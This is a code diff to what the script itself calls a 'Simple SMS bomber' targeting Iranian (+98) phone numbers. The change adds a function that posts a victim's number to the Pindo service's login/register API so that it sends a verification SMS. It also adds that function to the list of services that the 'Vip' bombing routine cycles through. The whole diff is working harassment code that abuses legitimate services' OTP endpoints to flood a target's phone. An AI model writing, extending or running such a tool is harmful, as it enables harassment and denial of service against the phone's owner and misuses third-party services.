@@ -51,6 +51,17 @@ def snap(phone):
         print(f"{r}[!] Snap Exception: {e}")
         return False
 
+def pindo(phone):
+    pindo_url = "https://api.pindo.ir/v1/user/login-register/"
+    pindo_payload = {"phone": "0"+phone.split("+98")[1]}
+    try:
+        pindo_response = post(timeout=5, url=pindo_url, json=pindo_payload).text
+        if "success" in pindo_response.lower():  # یا شرط مناسب با پاسخ API
+            print(f'{g}(Pindo) {a}Code Sent')
+            return True
+    except Exception as e:
+        print(f'[!] Pindo Exception: {e}')
+        return False
 
 def drnext(phone):
     phoneNumber_zero = "0" + phone.split("+98")[1]  # تبدیل +98 به 0 اول
@@ -126,7 +137,7 @@ def send_service_safe(service, phone):
 
 # Simple SMS bomber
 def Vip(phone, Time):
-    services = [snap, gap, divar, alibaba, mek, drnext, okorosh]
+    services = [snap, gap, divar, alibaba, mek, drnext, pindo, okorosh]
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
